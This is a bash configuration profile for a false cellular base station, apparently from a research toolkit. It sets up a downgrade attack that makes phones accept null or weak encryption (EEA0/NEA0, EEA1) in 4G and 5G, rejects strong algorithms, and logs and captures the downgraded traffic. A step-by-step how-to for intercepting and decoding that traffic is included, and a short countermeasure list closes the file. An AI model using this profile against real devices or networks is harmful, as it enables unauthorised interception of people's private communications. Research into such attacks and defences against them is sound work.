#!/bin/bash
#####################################################################
# DOWNGRADE ATTACK PROFILE
# 
# Purpose: Force UE to use weak or no encryption
# Method: Manipulate security algorithm negotiation
#
# WARNING: For RESEARCH and EDUCATIONAL purposes ONLY
#####################################################################

# Profile name
ATTACK_NAME="Downgrade Attack"
ATTACK_TYPE="downgrade"

#####################################################################
# SECURITY ALGORITHM DOWNGRADE
#####################################################################
# Force weak encryption algorithms
FORCE_WEAK_ENCRYPTION=true
FORCE_NO_ENCRYPTION=true

# Algorithm preference list (weakest first)
# 4G LTE
EEA_PREFERENCE_ORDER="EEA0, EEA1"  # Avoid EEA2 (AES-CTR, strongest)
EIA_PREFERENCE_ORDER="EIA0, EIA1"  # Avoid EIA2 (AES-CMAC, strongest)

# 5G NR
NEA_PREFERENCE_ORDER="NEA0, NEA1"  # Avoid NEA2 (AES-CTR, strongest)
NIA_PREFERENCE_ORDER="NIA0, NIA1"  # Avoid NIA2 (AES-CMAC, strongest)

#####################################################################
# ATTACK STRATEGY
#####################################################################
# How to perform the downgrade
STRATEGY="advertise_weak_only"  # Options: advertise_weak_only, reject_strong, mitm_manipulation

# If UE requests strong encryption, reject and force renegotiation
REJECT_STRONG_ALGORITHMS=true

# Advertise only weak algorithms in security capabilities
ADVERTISE_EEA0_ONLY=true
ADVERTISE_EIA0_ONLY=false  # Some integrity is needed for attachment

#####################################################################
# CAPTURE SETTINGS
#####################################################################
# Log downgrade attempts and results
CAPTURE_LOG="/tmp/downgrade_attack.log"
CAPTURE_FORMAT="json"

# What to log
LOG_ALGORITHM_NEGOTIATION=true
LOG_SECURITY_MODE_COMMAND=true
LOG_SECURITY_MODE_COMPLETE=true
LOG_UE_CAPABILITIES=true

# Capture traffic after downgrade
CAPTURE_DOWNGRADED_TRAFFIC=true
TRAFFIC_PCAP="/tmp/downgraded_traffic.pcap"

#####################################################################
# NAS SECURITY MODE COMMAND
#####################################################################
# Manipulate security mode command
SECURITY_MODE_EEA="EEA0"
SECURITY_MODE_EIA="EIA1"  # Need some integrity

# Replay protection
DISABLE_REPLAY_PROTECTION=false  # Keep enabled for successful attach

#####################################################################
# SUCCESS CRITERIA
#####################################################################
# Define what counts as successful downgrade
SUCCESS_IF_EEA0=true
SUCCESS_IF_EEA1=true
SUCCESS_IF_EEA2=false

#####################################################################
# PCAP CAPTURE
#####################################################################
PCAP_ENABLED=true
PCAP_FILE="/tmp/downgrade_attack.pcap"
PCAP_CAPTURE_ALL=true

#####################################################################
# LOGGING
#####################################################################
LOG_LEVEL="debug"
LOG_FILE="/tmp/downgrade_attack_detailed.log"

# Alert on successful downgrade
ALERT_ON_SUCCESS=true
ALERT_MESSAGE="Downgrade attack successful - UE using weak encryption"

#####################################################################
# STATISTICS
#####################################################################
TRACK_STATISTICS=true
STATS_FILE="/tmp/downgrade_stats.json"

# Track
TRACK_DOWNGRADE_ATTEMPTS=true
TRACK_DOWNGRADE_SUCCESSES=true
TRACK_ALGORITHM_DISTRIBUTION=true

#####################################################################
# DESCRIPTION
#####################################################################
ATTACK_DESCRIPTION="Downgrade attack forces UE to use weak or no encryption by manipulating security algorithm negotiation during attachment."

ATTACK_HOWTO="1. Start false BS with this profile
2. UE connects to false BS
3. During security setup, false BS offers only weak algorithms
4. UE accepts weak encryption (EEA0/EEA1)
5. Traffic can be intercepted and decoded
6. Logs contain negotiated algorithms and captured traffic"

ATTACK_COUNTERMEASURES="- Implement minimum encryption requirements on UE
- Reject connections without strong encryption (EEA2/NEA2)
- Monitor for downgrade attempts
- Use 5G standalone with mandatory strong encryption
- Alert users when connected to weak security"

